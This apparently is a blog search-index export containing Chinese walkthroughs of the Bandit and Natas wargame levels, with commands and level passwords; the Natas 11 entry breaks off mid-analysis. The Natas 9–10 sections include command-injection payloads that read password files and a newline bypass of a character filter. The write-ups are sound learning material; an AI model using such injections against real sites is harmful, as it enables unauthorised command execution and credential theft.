<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>bandit(level 0-19)</title>
    <url>/2023/05/14/bandit-level-0-19/</url>
    <content><![CDATA[<h1 id="bandit"><a href="#bandit" class="headerlink" title="bandit"></a>bandit</h1><h2 id="字符作用"><a href="#字符作用" class="headerlink" title="字符作用"></a>字符作用</h2><blockquote>
<p>| 表示管道，上一条命令的输出，作为下一条命令参数，通常用来过滤&#x2F;汇总数据。</p>
</blockquote>
<blockquote>
<p>&amp;&amp;表示前一条命令执行成功时，才执行后一条命令；反之，前面的命令执行失败，则&amp;&amp;后面的命令不会被执行。</p>
</blockquote>
<blockquote>
<p>&amp;表示任务在后台执行，即使ssh窗口关闭，服务依然会在后台持续运行。</p>
</blockquote>
<blockquote>
<p>||表示上一条命令执行失败后，才执行下一条命令。一旦执行到一条成功的命令，后面用****||****连接的命令，就不会再被执行。</p>
</blockquote>
<blockquote>
<p>＞把正常信息（剔除错误信息）重定向到另一个文件内</p>
<p><em><strong>*2&gt;*</strong></em> &#x2F;dev&#x2F;null意思就是把错误输出到“黑洞” ，不会显示在屏幕上。</p>
</blockquote>
<p>[Linux技巧(六)：命令尾部&amp;的作用 &amp;&amp;、|、||、；、()、&amp;＞、 2＞&amp;1 的用法和区别，很实用_linux &amp;_血煞长虹的博客-CSDN博客](<a href="https://blog.csdn.net/succing/article/details/127355545?ops_request_misc=%7B%22request_id%22:%22168405323416800215011812%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168405323416800215011812&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127355545-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">https://blog.csdn.net/succing/article/details/127355545?ops_request_misc=%7B%22request%5Fid%22%3A%22168405323416800215011812%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168405323416800215011812&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127355545-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=linux</a> |&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>我用的windows，下载了mobaXterm用于进行ssh连接</p>
<p>是说level 1的密码呢在readme文件中，用到cat 找出来即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513211057882.png" alt="image-20230513211057882"></p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>exit，然后r，重新建立连接，login as bandit1，密码是上级找到的</p>
<p>密码在虚线文件名中，这时候cat -就不管用了。指定文件完整路径即可。</p>
<p><img src="/image-20230513212947940.png" alt="image-20230513212947940"></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>文件名有空格</p>
<p>使用引号括起来</p>
<p><img src="/image-20230513214101452.png" alt="image-20230513214101452"></p>
<p>aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG</p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>说是在inhere目录下的隐藏文件中</p>
<p>需要用到ls -a命令查看隐藏</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513214557871.png" alt="image-20230513214557871"></p>
<p>2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe</p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>在inhere目录下，只有一个唯一可读的文件</p>
<p>由于文件名都有规律，且有特殊符号，于是我用了 cat .&#x2F;-file0{0,1,2…9}的方法，也就是在末尾3个之间，再cat .&#x2F;-file07试试，有了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221122380.png" alt="image-20230513221122380"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221420135.png" alt="image-20230513221420135"></p>
<p>lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR</p>
<p>正解操作是：</p>
<p>file .&#x2F;-file* 查看文件类型</p>
<p>cat .&#x2F;-file07</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>密码存储文件在inhere目录下，且可读、1033bytes、不可执行</p>
<p>inhere目录下有将近20个目录，一个个来不太现实，用到du命令</p>
<p>du : 显示每个文件和目录的磁盘使用空间~~~文件的大小。</p>
<p>命令参数：</p>
<p>-a   #显示目录中文件的大小  单位 KB 。</p>
<p>-b  #显示目录中文件的大小，以字节byte为单位。</p>
<p>-c  #显示目录中文件的大小，同时也显示总和；单位KB。</p>
<p>-k 、 -m  #显示目录中文件的大小，-k 单位KB，-m 单位MB.</p>
<p>-s  #仅显示目录的总值，单位KB。</p>
<p>-h  #以K  M  G为单位显示，提高可读性~~~（最常用的一个~也可能只用这一个就满足需求了）<br><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223236240.png" alt="image-20230513223236240"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223206962.png" alt="image-20230513223206962"></p>
<p>du -a -b</p>
<p>cat .&#x2F;maybehere07&#x2F;.file2</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223351281.png" alt="image-20230513223351281"></p>
<p>P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU</p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>被存在服务器的某处，由用户bandit7所有，bandit6组所有，33bytes</p>
<p>find基本用法：find [PATH] [option] [action]  </p>
<p>-user name : 列出文件所有者为name的文件<br>        -group name : 列出文件所属用户组为name的文件<br>        -uid n : 列出文件所有者为用户ID为n的文件<br>        -gid n : 列出文件所属用户组为用户组ID为n的文件  </p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112457648.png" alt="image-20230514112457648"></p>
<p>可以使用 <strong>2&gt;&#x2F;dev&#x2F;null</strong> 将错误信息重定向</p>
<p><code>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112752119.png" alt="image-20230514112752119"></p>
<p>参考<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>在data.txt文件中内容为<strong>millionth</strong>的那一行中</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514114655477.png" alt="image-20230514114655477"></p>
<p>TESKZC0XvTetK0S9xNwm25STk5iWrBvP</p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>在data.txt中，仅出现一次的行文本中</p>
<p>sort与uniq命令</p>
<p>sort排序，</p>
<p>uniq是去掉相邻的重复行，-c统计次数，-u显示不重复的行</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115858357.png" alt="image-20230514115858357"></p>
<p>-c找出现次数为1的即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115916436.png" alt="image-20230514115916436"></p>
<p>参考：<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>在data.txt文件中的少数几个人类可读的字符串中，前面有几个&#x3D;符号</p>
<p>一般查看有乱码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121138624.png" alt="image-20230514121138624"></p>
<p><code>用strings data.txt</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121241304.png" alt="image-20230514121241304"></p>
<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>data.txt文件中，但是包含base64编码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121610805.png" alt="image-20230514121610805"></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>data.txt文件中，但是rot13加密</p>
<p>tr命令：对输入字符进行替换、压缩和删除</p>
<p>将所有的字符向后移动13位,但要保持大写和小写</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122106548.png" alt="image-20230514122106548"></p>
<p>参考：[使用ROT13加密解密_tr解rot13_apersonlikep的博客-CSDN博客](<a href="https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request_id%22:%22168403789316800182732613%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168403789316800182732613&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request%5Fid%22%3A%22168403789316800182732613%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168403789316800182732613&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=linux</a> rot13&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>是data.txt文件，但是反复压缩，十六进制转储。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122659959.png" alt="image-20230514122659959"></p>
<p>xxd命令：转二级制、十六进制</p>
<p>mv命令：重命名</p>
<p>gzip&#x2F;bzip2 -d&#x2F;tar -xvf命令：解压缩</p>
<p>先转二级制</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123813942.png" alt="image-20230514123813942"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123825354.png" alt="image-20230514123825354"></p>
<p>重命名gz、解压</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123946806.png" alt="image-20230514123946806"></p>
<p>重命名bz2、解压</p>
<p><img src="/image-20230514124152671.png" alt="image-20230514124152671"></p>
<p>重命名gz、解压</p>
<p><img src="/image-20230514124254797.png" alt="image-20230514124254797"></p>
<p>重命名tar、解压</p>
<p><img src="/image-20230514124423926.png" alt="image-20230514124423926"></p>
<p><img src="/image-20230514124556058.png" alt="image-20230514124556058"></p>
<p>重命名bz2，解压</p>
<p><img src="/image-20230514124733776.png" alt="image-20230514124733776"></p>
<p>重命名tar、解压</p>
<p><img src="/image-20230514124850246.png" alt="image-20230514124850246"></p>
<p>重命名gz、解压</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514124956549.png" alt="image-20230514124956549"></p>
<h2 id="ssh、telnet、nc、openssl、nmap工具篇"><a href="#ssh、telnet、nc、openssl、nmap工具篇" class="headerlink" title="ssh、telnet、nc、openssl、nmap工具篇"></a>ssh、telnet、nc、openssl、nmap工具篇</h2><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>在**&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14**中，且只能由bandit14用户读取。且提供了一个私有SSH密钥。</p>
<!--ssh -i 秘钥文件名称 root@远程IP地址-->

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514130400052.png" alt="image-20230514130400052"></p>
<p>报错了，看不懂，但是看到绿字说22端口登录是不支持的，于是换个端口。</p>
<p>加了个-p 2220，虽然也报错，但还是提示连到了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132248403.png" alt="image-20230514132248403"></p>
<p>查看即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132359501.png" alt="image-20230514132359501"></p>
<p>fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>连接到本机，且端口为30000提交密码</p>
<p>telnet ip地址 端口</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133034901.png" alt="image-20230514133034901"></p>
<p>jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt</p>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>在localhost，端口为30001处提交上关密码，且有ssl加密</p>
<p>openssl：多用途、跨平台密码工具</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133923601.png" alt="image-20230514133923601"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133934323.png" alt="image-20230514133934323"></p>
<p>JQttfApK4SeyHwDlI9SXGR50qclOAil1</p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>目的是获取证书，将上一级的密码发送至端口范围为31000到32000的localhost上。1.找出有哪些端口是服务器监听着的；2.找出哪些是使用SSL的；3.只有一个服务器是会给你下一级证书的，其它的只会重复你发给它的。</p>
<p>知识点：端口扫描</p>
<p><code>nmap localhost -p310000-320000</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515113201632.png" alt="image-20230515113201632"></p>
<p><code>openssl s_client -connect localhost:port</code>对上述端口依次尝试，并提交密码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114635689.png" alt="image-20230515114635689"></p>
<p>port为31790时</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114912840.png" alt="image-20230515114912840"></p>
<p>可以知道，又是私钥登陆，与ssh -i有关</p>
<p>存放该私钥。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120130800.png" alt="image-20230515120130800"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120139520.png" alt="image-20230515120139520"></p>
<p><code>ssh -i /tmp/my111/key bandit17@localhost -p2220</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120357068.png" alt="image-20230515120357068"></p>
<p>要设定权限，700，即只有拥有者可以读写。</p>
<p><code>chmod 700 /tmp/my111/key</code></p>
<p><img src="/../../../Typora/img111/image-20230515120619059.png" alt="image-20230515120619059"></p>
<p>成功登入。</p>
<h2 id="level-17-gt-18"><a href="#level-17-gt-18" class="headerlink" title="level 17-&gt;18"></a>level 17-&gt;18</h2><p>在主目录有两文件<strong>passwords.old and passwords.new</strong>. </p>
<p>下一级的密码在 <strong>passwords.new</strong>里，并且这个old和new只有一行改动了的。</p>
<p>​		注意：当登入bandit18时看到”Byebye!”，这和bandit19有关。</p>
<p>diff命令，比较文件不同。</p>
<ul>
<li><p>“|”表示前后2个文件内容有不同</p>
</li>
<li><p>“&lt;”表示后面文件比前面文件少了1行内容</p>
</li>
<li><p>“&gt;”表示后面文件比前面文件多了1行内容</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130247402.png" alt="image-20230515130247402"></p>
</li>
</ul>
<p>hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg</p>
<p>exit -&gt;r</p>
<p>登入bandit18，输入密码出现：<img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130727349.png" alt="image-20230515130727349"></p>
<h2 id="level-18-gt-19"><a href="#level-18-gt-19" class="headerlink" title="level 18-&gt;19"></a>level 18-&gt;19</h2><p>下一级密码在主目录的readme中，但是嘞，有人修改了.bashrc，使得在使用SSH登录时注销。</p>
<p>考察点：ssh登陆后可以跟命令执行</p>
<p>所以在bandit17时采用远程登录。</p>
<p><code>ssh bandit18@localhost -p2220</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515133004926.png" alt="image-20230515133004926"></p>
<p>上图中，rm和chmod也是不允许的操作，查找其他博主的wp，在后面加了“cat  readme”但没效果</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515145336983-1684133695637-1.png"></p>
<p>止步于此，没权限，不搞了。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ssh</tag>
        <tag>bandit</tag>
      </tags>
  </entry>
  <entry>
    <title>NATAS</title>
    <url>/2023/05/14/NATAS/</url>
    <content><![CDATA[<h2 id="NATAS-0"><a href="#NATAS-0" class="headerlink" title="NATAS 0"></a>NATAS 0</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516141731305.png" alt="image-20230516141731305"></p>
<p>查看源代码页面。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516141801967.png" alt="image-20230516141801967"></p>
<p>g9D9cREhslqBKtcA2uocGHPfMZVzeFK6</p>
<h2 id="NATAS-1"><a href="#NATAS-1" class="headerlink" title="NATAS 1"></a>NATAS 1</h2><p>You can find the password for the next level on this page, but rightclicking has been blocked! </p>
<p>右键菜单用不了，直接url栏添加view-source:</p>
<p>h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7</p>
<h2 id="NATAS-2-路径"><a href="#NATAS-2-路径" class="headerlink" title="NATAS 2(路径)"></a>NATAS 2(路径)</h2><p>There is nothing on this page </p>
<p>右键菜单得</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516142055627.png" alt="image-20230516142055627"></p>
<p>这么小一个点，让我想到了图片宽高比</p>
<p>打开winhex，发现就是png，好吧，没用</p>
<p>f12查看网络嘞，发现了base64编码，解码后发现是第二关的密码，没用</p>
<p>看了wp才知道，&#x2F;files试试，查看路径</p>
<p><code>http://natas2.natas.labs.overthewire.org/files</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/20230516152928.png" alt="index"></p>
<h2 id="NATAS-3-robots-txt"><a href="#NATAS-3-robots-txt" class="headerlink" title="NATAS 3(robots.txt)"></a>NATAS 3(robots.txt)</h2><p>There is nothing on this page</p>
<p>查看源代码后</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516180626251.png" alt="image-20230516180626251"></p>
<p>好像确实没东西诶。</p>
<p>看了wp，提示说搜索引擎的话，看robots.txt</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516182801703.png" alt="image-20230516182801703"></p>
<p>路径 &#x2F;s3cr3t&#x2F;</p>
<p>输入下，给了user.txt，点击查看得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm</span><br></pre></td></tr></table></figure>

<h2 id="NATAS-4-Referer注入"><a href="#NATAS-4-Referer注入" class="headerlink" title="NATAS 4(Referer注入)"></a>NATAS 4(Referer注入)</h2><p><img src="/../../../Typora/img111/image-20230516182950328.png" alt="image-20230516182950328"></p>
<p>说是没权限，考虑要bp，右键链接，抓包后把referer改一下</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183538845.png" alt="image-20230516183538845"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183557188.png" alt="image-20230516183557188"></p>
<p>Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD</p>
<h2 id="NATAS-5-Cookie注入"><a href="#NATAS-5-Cookie注入" class="headerlink" title="NATAS 5(Cookie注入)"></a>NATAS 5(Cookie注入)</h2><p>Access disallowed. You are not logged in</p>
<p>查看源代码，没有。</p>
<p>直接抓包吧</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183915010.png" alt="image-20230516183915010"></p>
<p>Cookie处为0，改为1试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183943554.png" alt="image-20230516183943554"></p>
<h2 id="NATAS-6-php代码审计"><a href="#NATAS-6-php代码审计" class="headerlink" title="NATAS 6 (php代码审计)"></a>NATAS 6 (php代码审计)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516184055751.png" alt="image-20230516184055751"></p>
<p>看下源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516184111016.png" alt="image-20230516184111016"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_key_exists ( mixed $key , array $array ) : bool</span><br></pre></td></tr></table></figure>

<p>检查数组中是否存在指定键名。</p>
<p>我们看路径为，includes&#x2F;secret.inc</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194213702.png" alt="image-20230516194213702"></p>
<p>也就是说输入的值要和该路径值是相同的</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194332011.png" alt="image-20230516194332011"></p>
<h2 id="NATAS-7-任意命令执行"><a href="#NATAS-7-任意命令执行" class="headerlink" title="NATAS 7 (任意命令执行)"></a>NATAS 7 (任意命令执行)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194441515.png" alt="natas7页面"></p>
<p>点击之后出现效果</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194519670.png" alt="natas7的home页面"></p>
<p>查看源代码提示了密码位置</p>
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516202112882.png" alt="image-20230516202112882"></p>
<h2 id="NATAS-8-php代码审计"><a href="#NATAS-8-php代码审计" class="headerlink" title="NATAS 8 (php代码审计)"></a>NATAS 8 (php代码审计)</h2><p>和NATAS 6一样的页面，我们看源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516202232789.png" alt="NATAS 8源代码"></p>
<p>分析代码可知，输入框中的值经过encodeSecret()函数处理后的值与上述3d…相等即可</p>
<p>先base64_encode，再strrev(逆置)，再bin2hex(ASCII字符串转化为16进制)</p>
<p><code>hex2bin(hexString)</code>的作用是将字符串作为<code>十六进制</code>的模式进行处理，”68656c6c6f”<code>会被处理成</code>“68” “65” “6c” “6c” “6f”<code>，然后转换成对应的二进制数值，</code>“68”（注意是字符串 2bytes）<code>转为二进制数值是 </code>01101000（注意是数值 1byte）<code>，输出至终端其实就是</code>h（1bytes）<code>的，依次处理后，我们成功的将</code>10bytes<code>的字符串</code>“68656c6c6f”<code>转换成了</code>5bytes<code>的字符串</code>“hello”&#96;</p>
<p><code>bin2hex(binString)</code>则是将待处理的数据的<code>二进制bit串</code>进行<code>16进制</code>转换，并返回相应的<code>16进制形式的字符串</code>，这里的<code>bin</code>是说会将其作为二进制流，转换成对应的十六进制流，然后再以对应的字符串方式返回。比如<code>&quot;h&quot;</code>的<code>二进制bit串</code>是<code>01101000</code>，对应的十六进制是 <code>0x68</code>，相应的字符串形式是<code>&quot;68&quot;</code>，依次继续解包处理 <code>&quot;e&quot; &quot;l&quot; &quot;l&quot; &quot;o&quot;</code> 后得到的字符串就是<code>&quot;68656c6c6f&quot;</code>。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204322265.png" alt="image-20230516204322265"></p>
<p>参考：<a href="https://blog.csdn.net/weixin_33896726/article/details/91966490"> hex2bin &#x2F; bin2hex &#x2F; pack &#x2F; unpack 的理解及应用_weixin_33896726的博客-CSDN博客</a></p>
<p>那么进行相反操作，先hex2bin()-&gt;strrev-&gt;base64_decode</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204429541.png" alt="image-20230516204429541"></p>
<p>输入框提交oubWYf2kBq即可。</p>
<h2 id="NATAS-9-RCE"><a href="#NATAS-9-RCE" class="headerlink" title="NATAS 9 (RCE)"></a>NATAS 9 (RCE)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204620916.png" alt="image-20230516204620916"></p>
<p>先看源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204642815.png" alt="image-20230516204642815"></p>
<p><em>passthru</em>() 允许您运行外部程序，并在屏幕上显示结果。不需要使用 echo 或 return 来查看结果</p>
<p>上述代码应该是如果key不为空，就去在dictionary.txt去找含key的行</p>
<p>grep，linux中的文本匹配命令, -i 不区分大小写地搜索</p>
<p>看看txt文件内容</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516205145633.png" alt="image-20230516205145633"></p>
<p>嘶，有什么意义嘞。</p>
<p>看了wp说是，已知grep，应该联想到<strong>命令注入漏洞</strong>，又已知&#x2F;etc&#x2F;natas_webpass目录下存放着各级命令。截断grep命令即可。</p>
<p><code>;cat /etc/natas_webpass/natas10 #</code></p>
<p>;用于截断前面的grep -i，#用于注释后面的dictionary.txt</p>
<h2 id="NATAS-10-RCE"><a href="#NATAS-10-RCE" class="headerlink" title="NATAS 10 (RCE)"></a>NATAS 10 (RCE)</h2><p>在NATAS 9的基础上，For security reasons, we now filter on certain characters，过滤了一些特定字符</p>
<p>源代码可以看出</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516214122214.png" alt="image-20230516214122214"></p>
<p>过滤了常见符 &amp;、|、;</p>
<p>哦豁，那咋办。</p>
<p>可用**%0a、%0d代替**。</p>
<p><code>%0a cat /etc/natas_webpass/natas11#</code></p>
<p>输入框输入提交时，无显示；</p>
<p><strong>直接在url处输入。</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516215849290.png" alt="image-20230516215849290"></p>
<p>参考：命令注入的各种绕过：<a href="https://blog.csdn.net/qq_41497476/article/details/107042961?ops_request_misc=%7B%22request_id%22:%22168424518616800215084685%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168424518616800215084685&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-107042961-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=;%7C&%5D%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">CTFhub RCE 命令注入部分_qq_41497476的博客-CSDN博客</a></p>
<h2 id="NATAS-11-php代码审计、异或逆推、修改Cookie"><a href="#NATAS-11-php代码审计、异或逆推、修改Cookie" class="headerlink" title="NATAS 11 (php代码审计、异或逆推、修改Cookie)"></a>NATAS 11 (php代码审计、异或逆推、修改Cookie)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516220039092.png" alt="natas11页面"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line">if($data[&quot;showpassword&quot;] == &quot;yes&quot;) &#123;`</span><br><span class="line">  `print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先从最后的代码分析，如果$data[“showpassword”] &#x3D;&#x3D; “yes”，即可得到密码。showpassword是什么？</p>
<p>原始的数据是个数组，有两部分，它的showpassword部分是no。</p>
<p>看$data怎么得到哈，从最后看起，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123;</span><br><span class="line">  if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $_REQUEST[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">    $data[&#x27;bgcolor&#x27;] = $_REQUEST[&#x27;bgcolor&#x27;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br></pre></td></tr></table></figure>



<p>这一段就是页面上，点击按钮，就设置颜色那一块。</p>
<p>看一下loadData()、saveData()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function loadData($def) &#123;</span><br><span class="line">  global $_COOKIE;</span><br><span class="line">  $mydata = $def;#输入的值</span><br><span class="line">  if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123;</span><br><span class="line">  $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);#将cookie先base64解码，再异或后json解码才与输入值是同类型</span><br><span class="line"> </span><br><span class="line">  if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $tempdata[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">    $mydata[&#x27;showpassword&#x27;] = $tempdata[&#x27;showpassword&#x27;];</span><br><span class="line">    $mydata[&#x27;bgcolor&#x27;] = $tempdata[&#x27;bgcolor&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $mydata;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个作用应该是将原始数组解密，存成mydata数组</p>
<p><code>function saveData($d) &#123;   setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</code><br><code>&#125;</code></p>
